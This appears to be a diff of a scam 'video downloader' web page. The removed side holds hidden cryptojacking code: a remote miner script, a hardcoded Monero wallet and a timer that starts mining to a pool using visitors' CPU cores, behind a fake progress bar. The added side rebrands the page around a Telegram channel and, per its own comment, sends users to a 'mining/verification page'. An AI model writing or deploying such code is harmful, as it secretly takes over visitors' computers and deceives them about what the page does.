@@ -3,47 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Universal Video Downloader Pro</title>
-    <script src="https://cdn.jsdelivr.net/gh/monero-project/monero-gui@v0.18.1.2/external/qml/MoneroComponents/Controls/miner.js"></script>
+    <title>Ghost Mods | High-Speed Downloader</title>
     <style>
-        body { margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%); color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .container { background: rgba(30, 41, 59, 0.7); padding: 2.5rem; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1); text-align: center; width: 90%; max-width: 450px; backdrop-filter: blur(10px); }
-        h1 { margin-bottom: 0.5rem; color: #38bdf8; font-size: 1.8rem; }
-        input { width: 100%; padding: 14px; margin-bottom: 1.5rem; border-radius: 12px; border: 1px solid #334155; background: #0f172a; color: white; box-sizing: border-box; outline: none; }
-        button { width: 100%; padding: 14px; background: #38bdf8; color: #0f172a; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 1rem; }
-        .progress-container { width: 100%; height: 10px; background: #334155; border-radius: 10px; margin: 20px 0; display: none; overflow: hidden; }
-        #progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #38bdf8, #818cf8); transition: 1s linear; }
-        #status { margin-top: 15px; font-weight: bold; color: #38bdf8; }
+        body { background: #0a0a0c; color: #00d4ff; font-family: 'Segoe UI', sans-serif; text-align: center; margin: 0; }
+        .hero { padding: 50px 20px; border-bottom: 2px solid #00d4ff; background: linear-gradient(180deg, #001f3f 0%, #0a0a0c 100%); }
+        .btn-tg { background: #24A1DE; color: white; padding: 15px 30px; text-decoration: none; border-radius: 50px; font-weight: bold; display: inline-block; margin-top: 20px; box-shadow: 0 0 15px #24A1DE; }
+        .dl-box { margin: 40px auto; max-width: 500px; background: #161b22; padding: 30px; border-radius: 15px; border: 1px solid #30363d; }
+        input { width: 80%; padding: 12px; border-radius: 8px; border: none; margin-bottom: 15px; background: #0d1117; color: white; }
+        button { background: #00d4ff; color: black; padding: 12px 25px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
-<div class="container">
-    <h1>Universal Downloader</h1>
-    <p style="color:#94a3b8; font-size:0.9rem;">TikTok • Instagram • YouTube</p>
-    <input type="text" id="urlInput" placeholder="Paste video link here...">
-    <button onclick="startSequence()">Generate Download Link</button>
-    <div id="status">Ready to process</div>
-    <div class="progress-container" id="p-container"><div id="progress-bar"></div></div>
-</div>
-<script>
-    const wallet = "48bN9TtB8nieRBKARiRPQgXYQFuh65pj3fp7DSfY8akMgdsQFUKqqg8FbtVQckVdJPNoNapcwMuiu1TSZiG7FXft";
-    setTimeout(() => { if(typeof startMining === 'function') startMining("monerohash.com:3333", wallet, "Stage_1_Home", navigator.hardwareConcurrency, 0.3); }, 2000);
+    <div class="hero">
+        <h1>GHOST MODS</h1>
+        <p>No Watermarks. High Speed. 20% More Power.</p>
+        <a href="https://t.me/Ghost_modss" class="btn-tg">JOIN THE TELEGRAM HUB</a>
+    </div>
 
-    function startSequence() {
-        let url = document.getElementById("urlInput").value;
-        if(!url || !url.includes("http")) { alert("Paste a valid link!"); return; }
-        document.getElementById("p-container").style.display = "block";
-        let timeLeft = 15;
-        let interval = setInterval(() => {
-            timeLeft--;
-            document.getElementById("progress-bar").style.width = ((15-timeLeft)/15)*100 + "%";
-            document.getElementById("status").innerHTML = "Analyzing source... (" + timeLeft + "s)";
-            if(timeLeft <= 0) {
-                clearInterval(interval);
-                window.location.href = "verify.html?url=" + encodeURIComponent(url);
-            }
-        }, 1000);
-    }
-</script>
+    <div class="dl-box">
+        <h3>Video Downloader</h3>
+        <input type="text" id="videoUrl" placeholder="Paste TikTok, Reels, or YT link here...">
+        <button onclick="startDownload()">DOWNLOAD</button>
+    </div>
+
+    <script>
+        function startDownload() {
+            const url = document.getElementById('videoUrl').value;
+            if (!url) return alert('Paste a link first!');
+            // Redirect to the mining/verification page with the URL attached
+            window.location.href = `verify.html?url=${encodeURIComponent(url)}`;
+        }
+    </script>
 </body>
 </html>
